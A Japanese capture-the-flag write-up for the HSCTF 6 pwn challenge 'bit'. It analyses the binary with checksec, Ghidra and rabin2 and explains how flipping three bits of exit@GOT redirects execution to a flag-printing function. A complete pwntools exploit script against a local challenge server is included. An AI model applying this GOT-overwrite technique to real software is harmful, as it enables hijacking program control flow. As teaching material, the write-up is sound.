---
tags: pwn
---

# HSCTF 6 - bit

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/hsncsclub/HSCTF-6-Problems>

## Writeup

### outline

バイナリ中で指定したアドレスの値を下位8ビットから1ビットだけ選んで反転できる、但し4回だけ。
`flag`というここに飛んだらフラグをあげるよと言っている関数があるのでここへ飛ぶことを目標にする。
NX bitが有効なので実行可能領域は書き換えられない、よってcallやjmp命令の引数をこの関数のアドレスには書き換えることはできない。
ということで考えられるのはGOT Overwriteになる。ここで4bitまでしか反転できないことから既にアドレスが解決している関数のGOTのflag関数への書き換えはおそらく無理、したがって呼ばれていない関数のGOTを書き換える

### binary

```
$ checksec bit
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

NXぐらいしかないので実行可能領域への書き込み以外は何でもできそう。

Ghidraのデコンパイル結果は次の通り

```clike
void main(undefined4 param_1,undefined4 param_2)

{
  ulong uVar1;
  int *piVar2;
  int in_GS_OFFSET;
  uint uVar3;
  uint uVar4;
  int cnt;
  char local_1e [10];
  undefined4 canary;
  undefined *puStack16;
  
  puStack16 = &param_1;
  canary = *(undefined4 *)(in_GS_OFFSET + 0x14);
  uVar4 = 2;
  uVar3 = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  puts(
      "Welcome to the bit.\n\nNo nonsense, just pwn this binary. You have 4 tries. Live up tokmh\'s expectations, and get the flag.\n"
      );
  cnt = 0;
  while( true ) {
    if (3 < cnt) {
      puts("Well, at least you tried.");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Give me the address of the byte: ",uVar3,uVar4);
    fgets(local_1e,10,stdin);
    uVar1 = strtoul(local_1e,(char **)0x0,0x10);
    piVar2 = __errno_location();
    *piVar2 = 0;
    piVar2 = __errno_location();
    if (*piVar2 == 0x22) break;
    printf("Give me the index of the bit: ");
    fgets(local_1e,10,stdin);
    uVar3 = strtol(local_1e,(char **)0x0,10);
    if (7 < (ushort)uVar3) {
      printf("Try again.");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    uVar4 = uVar3 & 0xffff;
    printf("Took care of %08x at offset %d for ya.\n\n",uVar1,uVar4);
    uVar3 = uVar3 & 0xffff;
    flip(uVar1);
    cnt = cnt + 1;
  }
  printf("Lol, try again (hex uint32).");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

最初の入力でどこのアドレスを書き換えるかを16進数で指定する。その後の入力でそのアドレスの何bit目を反転させるかを決める。但し下位8bitのいずれか1つしか書き換えることが出来ない(8以上の値をインデックスに指定すると`exit`する)。
反転を行っている`flip`関数のデコンパイル結果は次の通り

```clike
void flip(uint *param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  *param_1 = *param_1 ^ 1 << ((byte)param_2 & 0x1f);
  printf((char *)(iVar1 + 0x2ab),*param_1);
  return;
}
```
これを4回行うと`exit(0)`を吐いて終了する。

この反転の使い方だが`flag`関数というフラグを読んで表示してくれる関数がある。
```clike
void flag(void)

{
  FILE *__stream;
  int iVar1;
  
  printf("[🛐] pwn gods like you deserve this: ");
  __stream = fopen("flag","r");
  while( true ) {
    iVar1 = fgetc(__stream);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  fclose(__stream);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
よって何らかのジャンプに使われている値を`flag`のアドレスへと変更する問題だと思われる。

### 反転先

rabin2で書き換え可能な領域を調べる

```
$ rabin2 -S bit
[Sections]
00 0x00000000     0 0x00000000     0 ----- 
01 0x00000154    19 0x08048154    19 --r-- .interp
02 0x00000168    32 0x08048168    32 --r-- .note.ABI_tag
03 0x00000188    36 0x08048188    36 --r-- .note.gnu.build_id
04 0x000001ac    32 0x080481ac    32 --r-- .gnu.hash
05 0x000001cc   288 0x080481cc   288 --r-- .dynsym
06 0x000002ec   182 0x080482ec   182 --r-- .dynstr
07 0x000003a2    36 0x080483a2    36 --r-- .gnu.version
08 0x000003c8    48 0x080483c8    48 --r-- .gnu.version_r
09 0x000003f8    24 0x080483f8    24 --r-- .rel.dyn
10 0x00000410   104 0x08048410   104 --r-- .rel.plt
11 0x00000478    35 0x08048478    35 --r-x .init
12 0x000004a0   224 0x080484a0   224 --r-x .plt
13 0x00000580     8 0x08048580     8 --r-x .plt.got
14 0x00000590  1026 0x08048590  1026 --r-x .text
15 0x00000994    20 0x08048994    20 --r-x .fini
16 0x000009a8   383 0x080489a8   383 --r-- .rodata
17 0x00000b28    84 0x08048b28    84 --r-- .eh_frame_hdr
18 0x00000b7c   328 0x08048b7c   328 --r-- .eh_frame
19 0x00000f04     4 0x08049f04     4 --rw- .init_array
20 0x00000f08     4 0x08049f08     4 --rw- .fini_array
21 0x00000f0c   232 0x08049f0c   232 --rw- .dynamic
22 0x00000ff4    12 0x08049ff4    12 --rw- .got
23 0x00001000    64 0x0804a000    64 --rw- .got.plt
24 0x00001040     8 0x0804a040     8 --rw- .data
25 0x00001048     0 0x0804a048     4 --rw- .bss
26 0x00001048    41 0x00000000    41 ----- .comment
27 0x00001074  1280 0x00000000  1280 ----- .symtab
28 0x00001574   753 0x00000000   753 ----- .strtab
29 0x00001865   261 0x00000000   261 ----- .shstrtab
30 0x00000034   288 0x08048034   288 m-r-- PHDR
31 0x00000154    19 0x08048154    19 m-r-- INTERP
32 0x00000000  3268 0x08048000  3268 m-r-x LOAD0
33 0x00000f04   324 0x08049f04   328 m-rw- LOAD1
34 0x00000f0c   232 0x08049f0c   232 m-rw- DYNAMIC
35 0x00000168    68 0x08048168    68 m-r-- NOTE
36 0x00000b28    84 0x08048b28    84 m-r-- GNU_EH_FRAME
37 0x00000000     0 0x00000000     0 m-rw- GNU_STACK
38 0x00000f04   252 0x08049f04   252 m-r-- GNU_RELRO
39 0x00000000    52 0x08048000    52 m-rw- ehdr
```
NX bitが有効なので実行可能領域は当然書き換えできない。この内書き換え可能な領域を見ると有用そうなのは.got.pltなのでGOT Overwriteを狙う。
ここでアドレス解決を行う前はGOTには.plt内のアドレスが格納されている。一方でアドレス解決を行うとおそらく0x7f114514のように大きいアドレスがGOTに格納されるため4回の書き換えでは`flag`へ飛ばすことは出来ない。よって前者の未だにアドレス解決が行われていない関数を狙う。
今回は呼ばれたらそもそもプログラムが落ちるためおそらくどこでも呼ばれていないであろう`exit`のGOTのbit反転を狙う。

`exit@GOT`の初期値と`flag`のアドレスは2進数にすると次の通り
```
exit@GOT: 0b1000000001001000010011110110
flag    : 0b1000000001001000011010100110
diff    :                     ^  ^ ^
```

ビットが異なっている桁は3つ、よって4回までの反転で`exit@GOT`の中身を`flag`のアドレスに変えることは可能である。
但し、反転出来るのは指定したアドレスの下位8bitであり、`exit@GOT`の中身で書き換えたいのは(右端を0bit目として)4, 6, 9bit目なので9bit目を書き換える際はアドレスを1つ大きい位置に指定する必要がある。

そしてこの反転をしてもまだ1回分余っているが反転桁を入力するところで8以上の値を指定すると`exit`が呼ばれることから`flag`へ飛ぶことになる。

## Code

```python
from pwn import remote, process, p64, u32, ELF


def get_flip_bits(addr1, addr2):
    xored = addr1 ^ addr2

    ret = []
    idx = 0
    while xored != 0:
        if xored & 1 == 1:
            ret.append(idx)
        xored = xored >> 1
        idx += 1
        # print(xored)

    return ret


if __name__ == '__main__':
    target = "localhost"
    port = 4444

    elf = ELF("./bit")
    got = elf.got

    flag_addr = elf.symbols["flag"]
    exit_got = elf.got["exit"]
    exit_got_val = u32(elf.read(exit_got, 4))
    
    print(hex(flag_addr))
    print(hex(exit_got))
    print(hex(exit_got_val))

    print(bin(flag_addr))
    print(bin(exit_got_val))

    flips = get_flip_bits(flag_addr, exit_got_val)
    print(flips)

    s = remote(target, port)

    for flip in flips:
        s.recvuntil(b"Give me the address of the byte: ")
        target = exit_got + flip // 8
        s.sendline(hex(target)[2:].encode())
        s.recvuntil(b"Give me the index of the bit: ")
        s.sendline(str(flip % 8).encode())

    s.recvuntil(b"Give me the address of the byte: ")
    s.sendline(hex(target)[2:].encode())
    s.recvuntil(b"Give me the index of the bit: ")
    s.sendline(b"1919810")

    print(s.recvline())

```

## Flag

`hsctf{flippin_pwn_g0d}`

## 感想

実はncで数字を入れるだけで解けるので最初はそうやって解いた。その結果`flag`内のexitが実質再帰関数と化したため一生フラグを吐き出し続ける化け物が産まれた。
なお睡魔のせいでこのwriteupを書くためにncでの手順をExploitコードとして書き直すのに問題を解く以上の時間を費やした模様